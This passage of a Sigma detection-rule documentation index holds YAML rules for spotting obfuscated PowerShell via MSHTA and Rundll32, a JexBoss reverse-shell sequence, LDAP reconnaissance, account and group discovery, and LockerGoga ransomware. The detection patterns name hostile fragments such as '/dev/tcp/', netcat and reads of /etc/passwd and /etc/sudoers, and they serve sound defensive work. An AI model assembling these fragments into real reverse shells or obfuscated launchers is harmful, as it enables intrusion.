modified: 2022/03/07 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task31) logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - \u0026#39;set\u0026#39; - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39;mshta\u0026#39; - \u0026#39;vbscript:createobject\u0026#39; - \u0026#39;.run\u0026#39; - \u0026#39;(window.close)\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_mhsta.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use MSHTA"},{"categories":null,"contents":"Detects Obfuscated Powershell via use MSHTA in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use MSHTA id: ac20ae82-8758-4f38-958e-b44a3140ca88 status: test description: Detects Obfuscated Powershell via use MSHTA in Scripts author: Nikita Nazarov, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task31) date: 2020/10/08 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;set\u0026#39; - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39;mshta\u0026#39; - \u0026#39;vbscript:createobject\u0026#39; - \u0026#39;.run\u0026#39; - \u0026#39;(window.close)\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_use_mhsta.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use MSHTA"},{"categories":null,"contents":"Detects Obfuscated Powershell via use Rundll32 in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use Rundll32 id: 641a4bfb-c017-44f7-800c-2aee0184ce9b description: Detects Obfuscated Powershell via use Rundll32 in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/03/07 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task30) logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains|all: - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;shell32.dll\u0026#39; - \u0026#39;shellexec_rundll\u0026#39; ImagePath|contains: - \u0026#39;value\u0026#39; - \u0026#39;invoke\u0026#39; - \u0026#39;comspec\u0026#39; - \u0026#39;iex\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_use_rundll32_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use Rundll32"},{"categories":null,"contents":"Detects Obfuscated Powershell via use Rundll32 in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use Rundll32 id: a5a30a6e-75ca-4233-8b8c-42e0f2037d3b description: Detects Obfuscated Powershell via use Rundll32 in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2019/10/08 modified: 2022/03/08 references: - https://github.com/Neo23x0/sigma/issues/1009 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;shell32.dll\u0026#39; - \u0026#39;shellexec_rundll\u0026#39; ScriptBlockText|contains: - \u0026#39;value\u0026#39; - \u0026#39;invoke\u0026#39; - \u0026#39;comspec\u0026#39; - \u0026#39;iex\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_rundll32.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use Rundll32"},{"categories":null,"contents":"Detects Obfuscated Powershell via use Rundll32 in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use Rundll32 id: 36c5146c-d127-4f85-8e21-01bf62355d5a status: test description: Detects Obfuscated Powershell via use Rundll32 in Scripts author: Nikita Nazarov, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 date: 2019/10/08 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;shell32.dll\u0026#39; - \u0026#39;shellexec_rundll\u0026#39; CommandLine|contains: - \u0026#39;value\u0026#39; - \u0026#39;invoke\u0026#39; - \u0026#39;comspec\u0026#39; - \u0026#39;iex\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_use_rundll32.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use Rundll32"},{"categories":null,"contents":"Detects the mount of ISO images on an endpoint\nKnown false-positives Software installation ISO files References https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages https://twitter.com/MsftSecIntel/status/1257324139515269121 Raw rule (edit) title: ISO Image Mount id: 0248a7bc-8a9a-4cd8-a57e-3ae8e073a073 description: Detects the mount of ISO images on an endpoint status: experimental date: 2021/05/29 modified: 2021/11/20 author: Syed Hasan (@syedhasan009) references: - https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore - https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages - https://twitter.com/MsftSecIntel/status/1257324139515269121 tags: - attack.initial_access - attack.t1566.001 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Removable Storage\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 4663 ObjectServer: \u0026#39;Security\u0026#39; ObjectType: \u0026#39;File\u0026#39; ObjectName: \u0026#39;\\Device\\CdRom*\u0026#39; filter: ObjectName: \u0026#39;\\Device\\CdRom0\\setup.exe\u0026#39; condition: selection and not filter falsepositives: - Software installation ISO files level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_iso_mount.yml/","tags":["attack.initial_access","attack.t1566.001"],"title":"ISO Image Mount"},{"categories":null,"contents":"Detects suspicious command sequence that JexBoss\nKnown false-positives Unknown References https://www.us-cert.gov/ncas/analysis-reports/AR18-312A Raw rule (edit) title: JexBoss Command Sequence id: 8ec2c8b4-557a-4121-b87c-5dfb3a602fae status: test description: Detects suspicious command sequence that JexBoss author: Florian Roth references: - https://www.us-cert.gov/ncas/analysis-reports/AR18-312A date: 2017/08/24 modified: 2021/11/27 logsource: product: linux detection: selection1: - \u0026#39;bash -c /bin/bash\u0026#39; selection2: - \u0026#39;\u0026amp;/dev/tcp/\u0026#39; condition: selection1 and selection2 falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_susp_jexboss.yml/","tags":["attack.execution","attack.t1059.004"],"title":"JexBoss Command Sequence"},{"categories":null,"contents":"This event was observed on the target host during lateral movement. The process name within the event contains the process spawned post compromise. Account Name within the event contains the compromised user account name. This event should to be correlated with 4624 and 4688 for further intrusion context.\nKnown false-positives legal admin action Penetration tests where lateral movement has occurred. This event will be created on the target host. References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/wmiexec-vbs.htm https://www.fireeye.com/blog/threat-research/2017/08/monitoring-windows-console-activity-part-one.html Raw rule (edit) title: Lateral Movement Indicator ConDrv id: 29d31aee-30f4-4006-85a9-a4a02d65306c status: deprecated #Too many FP description: This event was observed on the target host during lateral movement. The process name within the event contains the process spawned post compromise. Account Name within the event contains the compromised user account name. This event should to be correlated with 4624 and 4688 for further intrusion context. author: Janantha Marasinghe date: 2021/04/27 modified: 2021/12/09 references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/wmiexec-vbs.htm - https://www.fireeye.com/blog/threat-research/2017/08/monitoring-windows-console-activity-part-one.html tags: - attack.lateral_movement - attack.execution - attack.t1021 - attack.t1059 logsource: product: windows service: security detection: selection: EventID: 4674 ObjectServer: \u0026#39;Security\u0026#39; ObjectType: \u0026#39;File\u0026#39; ObjectName: \u0026#39;\\Device\\ConDrv\u0026#39; condition: selection falsepositives: - legal admin action - Penetration tests where lateral movement has occurred. This event will be created on the target host. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_lateral_movement_condrv.yml/","tags":["attack.lateral_movement","attack.execution","attack.t1021","attack.t1059"],"title":"Lateral Movement Indicator ConDrv"},{"categories":null,"contents":"Detects executables launched outside their default directories as used by Lazarus Group (Bluenoroff)\nKnown false-positives unknown References https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf Raw rule (edit) title: Lazarus Session Highjacker id: 3f7f5b0b-5b16-476c-a85f-ab477f6dd24b status: test description: Detects executables launched outside their default directories as used by Lazarus Group (Bluenoroff) author: Trent Liffick (@tliffick), Bartlomiej Czyz (@bczyz1) references: - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf date: 2020/06/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\msdtc.exe\u0026#39; - \u0026#39;\\gpvc.exe\u0026#39; filter: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; condition: selection and not filter falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1036.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_lazarus_session_highjack.yml/","tags":["attack.defense_evasion","attack.t1036.005"],"title":"Lazarus Session Highjacker"},{"categories":null,"contents":"Detects possible Active Directory enumeration via LDAP\nReferences https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 https://github.com/BloodHoundAD/SharpHound3/blob/master/SharpHound3/LdapBuilder.cs Raw rule (edit) title: LDAP Reconnaissance / Active Directory Enumeration id: 31d68132-4038-47c7-8f8e-635a39a7c174 status: experimental description: Detects possible Active Directory enumeration via LDAP author: Adeem Mawani date: 2021/06/22 references: - https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 - https://github.com/BloodHoundAD/SharpHound3/blob/master/SharpHound3/LdapBuilder.cs logsource: product: windows service: ldap_debug definition: \u0026#39;Requires Microsoft-Windows-LDAP-Client/Debug ETW logging\u0026#39; detection: generic_search: EventID: 30 SearchFilter|contains: - \u0026#39;(groupType:1.2.840.113556.1.4.803:=2147483648)\u0026#39; - \u0026#39;(groupType:1.2.840.113556.1.4.803:=2147483656)\u0026#39; - \u0026#39;(groupType:1.2.840.113556.1.4.803:=2147483652)\u0026#39; - \u0026#39;(groupType:1.2.840.113556.1.4.803:=2147483650)\u0026#39; - \u0026#39;(sAMAccountType=805306369)\u0026#39; - \u0026#39;(sAMAccountType=805306368)\u0026#39; - \u0026#39;(sAMAccountType=536870913)\u0026#39; - \u0026#39;(sAMAccountType=536870912)\u0026#39; - \u0026#39;(sAMAccountType=268435457)\u0026#39; - \u0026#39;(sAMAccountType=268435456)\u0026#39; - \u0026#39;(objectCategory=groupPolicyContainer)\u0026#39; - \u0026#39;(objectCategory=organizationalUnit)\u0026#39; - \u0026#39;(objectCategory=Computer)\u0026#39; - \u0026#39;(objectCategory=nTDSDSA)\u0026#39; - \u0026#39;(objectCategory=server)\u0026#39; - \u0026#39;(objectCategory=domain)\u0026#39; - \u0026#39;(objectCategory=person)\u0026#39; - \u0026#39;(objectCategory=group)\u0026#39; - \u0026#39;(objectCategory=user)\u0026#39; - \u0026#39;(objectClass=trustedDomain)\u0026#39; - \u0026#39;(objectClass=computer)\u0026#39; - \u0026#39;(objectClass=server)\u0026#39; - \u0026#39;(objectClass=group)\u0026#39; - \u0026#39;(objectClass=user)\u0026#39; - \u0026#39;(primaryGroupID=521)\u0026#39; - \u0026#39;(primaryGroupID=516)\u0026#39; - \u0026#39;(primaryGroupID=515)\u0026#39; - \u0026#39;(primaryGroupID=512)\u0026#39; - \u0026#39;Domain Admins\u0026#39; suspicious_flag: EventID: 30 SearchFilter|contains: - \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)\u0026#39; - \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=2097152)\u0026#39; - \u0026#39;!(userAccountControl:1.2.840.113556.1.4.803:=1048574)\u0026#39; - \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=524288)\u0026#39; - \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=65536)\u0026#39; - \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=8192)\u0026#39; - \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=544)\u0026#39; - \u0026#39;!(UserAccountControl:1.2.840.113556.1.4.803:=2)\u0026#39; - \u0026#39;msDS-AllowedToActOnBehalfOfOtherIdentity\u0026#39; - \u0026#39;msDS-AllowedToDelegateTo\u0026#39; - \u0026#39;(accountExpires=9223372036854775807)\u0026#39; - \u0026#39;(accountExpires=0)\u0026#39; - \u0026#39;(adminCount=1)\u0026#39; - \u0026#39;ms-MCS-AdmPwd\u0026#39; narrow_down_filter: EventID: 30 SearchFilter|contains: - \u0026#39;(domainSid=*)\u0026#39; - \u0026#39;(objectSid=*)\u0026#39; condition: (generic_search and not narrow_down_filter) or (suspicious_flag) level: medium tags: - attack.discovery - attack.t1069.002 - attack.t1087.002 - attack.t1482 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/ldap/win_ldap_recon.yml/","tags":["attack.discovery","attack.t1069.002","attack.t1087.002","attack.t1482"],"title":"LDAP Reconnaissance / Active Directory Enumeration"},{"categories":null,"contents":"Detects registry key used by Leviathan APT in Malaysian focused campaign\nReferences https://www.elastic.co/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign Raw rule (edit) title: Leviathan Registry Key Activity id: 70d43542-cd2d-483c-8f30-f16b436fd7db status: experimental description: Detects registry key used by Leviathan APT in Malaysian focused campaign references: - https://www.elastic.co/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign author: Aidan Bracher date: 2020/07/07 modified: 2021/09/13 logsource: category: registry_event product: windows detection: selection: TargetObject: \u0026#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ntkd\u0026#39; condition: selection level: critical tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_apt_leviathan.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Leviathan Registry Key Activity"},{"categories":null,"contents":"Detects enumeration of local or remote network services.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md Raw rule (edit) title: Linux Network Service Scanning id: 3e102cd9-a70d-4a7a-9508-403963092f31 status: experimental description: Detects enumeration of local or remote network services. author: Alejandro Ortuno, oscd.community date: 2020/10/21 modified: 2021/09/14 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md tags: - attack.discovery - attack.t1046 logsource: category: process_creation product: linux definition: \u0026#39;Detect netcat and filter our listening mode\u0026#39; detection: netcat: Image|endswith: - \u0026#39;/nc\u0026#39; - \u0026#39;/netcat\u0026#39; network_scanning_tools: Image|endswith: - \u0026#39;/telnet\u0026#39; # could be wget, curl, ssh, many things. basically everything that is able to do network connection. consider fine tuning - \u0026#39;/nmap\u0026#39; netcat_listen_flag: CommandLine|contains: \u0026#39;l\u0026#39; condition: (netcat and not netcat_listen_flag) or network_scanning_tools falsepositives: - Legitimate administration activities level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_network_service_scanning.yml/","tags":["attack.discovery","attack.t1046"],"title":"Linux Network Service Scanning"},{"categories":null,"contents":"Detects the enumeration of other remote systems.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md Raw rule (edit) title: Linux Remote System Discovery id: 11063ec2-de63-4153-935e-b1a8b9e616f1 status: test description: Detects the enumeration of other remote systems. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md date: 2020/10/22 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection_1: Image|endswith: \u0026#39;/arp\u0026#39; CommandLine|contains: \u0026#39;-a\u0026#39; selection_2: Image|endswith: \u0026#39;/ping\u0026#39; CommandLine|contains: - \u0026#39; 10.\u0026#39; #10.0.0.0/8 - \u0026#39; 192.168.\u0026#39; #192.168.0.0/16 - \u0026#39; 172.16.\u0026#39; #172.16.0.0/12 - \u0026#39; 172.17.\u0026#39; - \u0026#39; 172.18.\u0026#39; - \u0026#39; 172.19.\u0026#39; - \u0026#39; 172.20.\u0026#39; - \u0026#39; 172.21.\u0026#39; - \u0026#39; 172.22.\u0026#39; - \u0026#39; 172.23.\u0026#39; - \u0026#39; 172.24.\u0026#39; - \u0026#39; 172.25.\u0026#39; - \u0026#39; 172.26.\u0026#39; - \u0026#39; 172.27.\u0026#39; - \u0026#39; 172.28.\u0026#39; - \u0026#39; 172.29.\u0026#39; - \u0026#39; 172.30.\u0026#39; - \u0026#39; 172.31.\u0026#39; - \u0026#39; 127.\u0026#39; #127.0.0.0/8 - \u0026#39; 169.254.\u0026#39; #169.254.0.0/16 condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1018 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_remote_system_discovery.yml/","tags":["attack.discovery","attack.t1018"],"title":"Linux Remote System Discovery"},{"categories":null,"contents":"Detects the process injection of a LittleCorporal generated Maldoc.\nKnown false-positives unknown References https://github.com/connormcgarr/LittleCorporal Raw rule (edit) title: LittleCorporal Generated Maldoc Injection id: 7bdde3bf-2a42-4c39-aa31-a92b3e17afac description: Detects the process injection of a LittleCorporal generated Maldoc. references: - https://github.com/connormcgarr/LittleCorporal status: experimental author: Christian Burkard date: 2021/08/09 logsource: category: process_access product: windows detection: selection: SourceImage|endswith: \u0026#39;winword.exe\u0026#39; CallTrace|contains|all: - \u0026#39;:\\Windows\\Microsoft.NET\\Framework64\\v2.\u0026#39; - \u0026#39;UNKNOWN\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.execution - attack.t1204.002 - attack.t1055.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_littlecorporal_generated_maldoc.yml/","tags":["attack.execution","attack.t1204.002","attack.t1055.003"],"title":"LittleCorporal Generated Maldoc Injection"},{"categories":null,"contents":"COM interface (EditionUpgradeManager) that is not used by standard executables.\nKnown false-positives unknown References https://www.snip2code.com/Snippet/4397378/UAC-bypass-using-EditionUpgradeManager-C/ https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611 Raw rule (edit) title: Load Undocumented Autoelevated COM Interface id: fb3722e4-1a06-46b6-b772-253e2e7db933 status: test description: COM interface (EditionUpgradeManager) that is not used by standard executables. author: oscd.community, Dmitry Uchakin references: - https://www.snip2code.com/Snippet/4397378/UAC-bypass-using-EditionUpgradeManager-C/ - https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611 date: 2020/10/07 modified: 2021/11/27 logsource: category: process_access product: windows detection: selection: CallTrace|contains: \u0026#39;editionupgrademanagerobj.dll\u0026#39; condition: selection fields: - ComputerName - User - SourceImage - TargetImage - CallTrace falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_load_undocumented_autoelevated_com_interface.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"Load Undocumented Autoelevated COM Interface"},{"categories":null,"contents":"Detects loading of kernel modules with insmod command. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.\nKnown false-positives Unknown References https://attack.mitre.org/techniques/T1547/006/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.006/T1547.006.md https://linux.die.net/man/8/insmod https://man7.org/linux/man-pages/man8/kmod.8.html Raw rule (edit) title: Loading of Kernel Module via Insmod id: 106d7cbd-80ff-4985-b682-a7043e5acb72 status: experimental description: Detects loading of kernel modules with insmod command. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. Adversaries may use LKMs to obtain persistence within the system or elevate the privileges. author: \u0026#39;Pawel Mazur\u0026#39; date: 2021/11/02 references: - https://attack.mitre.org/techniques/T1547/006/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.006/T1547.006.md - https://linux.die.net/man/8/insmod - https://man7.org/linux/man-pages/man8/kmod.8.html logsource: product: linux service: auditd detection: insmod: type: \u0026#39;SYSCALL\u0026#39; comm: insmod exe: /usr/bin/kmod condition: insmod falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1547.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_load_module_insmod.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1547.006"],"title":"Loading of Kernel Module via Insmod"},{"categories":null,"contents":"Detects enumeration of local system groups\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md Raw rule (edit) title: Local Groups Discovery id: 89bb1f97-c7b9-40e8-b52b-7d6afbd67276 status: test description: Detects enumeration of local system groups author: Ömer Günal, Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md date: 2020/10/11 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: - \u0026#39;/dscacheutil\u0026#39; CommandLine|contains|all: - \u0026#39;-q\u0026#39; - \u0026#39;group\u0026#39; selection_2: Image|endswith: - \u0026#39;/cat\u0026#39; CommandLine|contains: - \u0026#39;/etc/group\u0026#39; selection_3: Image|endswith: - \u0026#39;/dscl\u0026#39; CommandLine|contains|all: - \u0026#39;-list\u0026#39; - \u0026#39;/groups\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_local_groups.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Local Groups Discovery"},{"categories":null,"contents":"Detects enumeration of local system groups\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md Raw rule (edit) title: Local Groups Discovery id: 676381a6-15ca-4d73-a9c8-6a22e970b90d status: test description: Detects enumeration of local system groups author: Ömer Günal, Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md date: 2020/10/11 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection_1: Image|endswith: - \u0026#39;/groups\u0026#39; selection_2: Image|endswith: - \u0026#39;/cat\u0026#39; CommandLine|contains: - \u0026#39;/etc/group\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_local_groups.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Local Groups Discovery"},{"categories":null,"contents":"Detects enumeration of local systeam accounts on MacOS\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md Raw rule (edit) title: Local System Accounts Discovery id: ddf36b67-e872-4507-ab2e-46bda21b842c status: test description: Detects enumeration of local systeam accounts on MacOS author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: - \u0026#39;/dscl\u0026#39; CommandLine|contains|all: - \u0026#39;list\u0026#39; - \u0026#39;/users\u0026#39; selection_2: Image|endswith: - \u0026#39;/dscacheutil\u0026#39; CommandLine|contains|all: - \u0026#39;-q\u0026#39; - \u0026#39;user\u0026#39; selection_3: CommandLine|contains: - \u0026#39;\u0026#39;\u0026#39;x:0:\u0026#39;\u0026#39;\u0026#39; selection_4: Image|endswith: - \u0026#39;/cat\u0026#39; CommandLine|contains: - \u0026#39;/etc/passwd\u0026#39; - \u0026#39;/etc/sudoers\u0026#39; selection_5: Image|endswith: - \u0026#39;/id\u0026#39; selection_6: Image|endswith: - \u0026#39;/lsof\u0026#39; CommandLine|contains: - \u0026#39;-u\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1087.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_local_account.yml/","tags":["attack.discovery","attack.t1087.001"],"title":"Local System Accounts Discovery"},{"categories":null,"contents":"Detects enumeration of local systeam accounts\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md Raw rule (edit) title: Local System Accounts Discovery id: b45e3d6f-42c6-47d8-a478-df6bd6cf534c status: test description: Detects enumeration of local systeam accounts author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection_1: Image|endswith: - \u0026#39;/lastlog\u0026#39; selection_2: CommandLine|contains: - \u0026#39;\u0026#39;\u0026#39;x:0:\u0026#39;\u0026#39;\u0026#39; selection_3: Image|endswith: - \u0026#39;/cat\u0026#39; CommandLine|contains: - \u0026#39;/etc/passwd\u0026#39; - \u0026#39;/etc/sudoers\u0026#39; selection_4: Image|endswith: - \u0026#39;/id\u0026#39; selection_5: Image|endswith: - \u0026#39;/lsof\u0026#39; CommandLine|contains: - \u0026#39;-u\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1087.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_local_account.yml/","tags":["attack.discovery","attack.t1087.001"],"title":"Local System Accounts Discovery"},{"categories":null,"contents":"Detects LockerGoga Ransomware command line.\nKnown false-positives Unlikely References https://medium.com/@malwaredancer/lockergoga-input-arguments-ipc-communication-and-others-bd4e5a7ba80a https://blog.f-secure.com/analysis-of-lockergoga-ransomware/ https://www.carbonblack.com/blog/tau-threat-intelligence-notification-lockergoga-ransomware/ Raw rule (edit) title: LockerGoga Ransomware id: 74db3488-fd28-480a-95aa-b7af626de068 status: test description: Detects LockerGoga Ransomware command line. author: Vasiliy Burov, oscd.community references: - https://medium.com/@malwaredancer/lockergoga-input-arguments-ipc-communication-and-others-bd4e5a7ba80a - https://blog.f-secure.com/analysis-of-lockergoga-ransomware/ - https://www.carbonblack.com/blog/tau-threat-intelligence-notification-lockergoga-ransomware/ date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;-i SM-tgytutrc -s\u0026#39; condition: selection falsepositives: - Unlikely level: critical tags: - attack.impact - attack.t1486 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mal_lockergoga_ransomware.yml/","tags":["attack.impact","attack.t1486"],"title":"LockerGoga Ransomware"},{"categories":null,"contents":"Detection of logins performed with WMI\nKnown false-positives Monitoring tools Legitimate system administration Raw rule (edit) title: Login with WMI id: 5af54681-df95-4c26-854f-2565e13cfab0 status: stable description: Detection of logins performed with WMI author: Thomas Patzke date: 2019/12/04 tags: - attack.execution - attack.t1047 logsource: product: windows service: security detection: selection: EventID: 4624 ProcessName|endswith: \u0026#39;\\WmiPrvSE.exe\u0026#39; condition: selection falsepositives: - 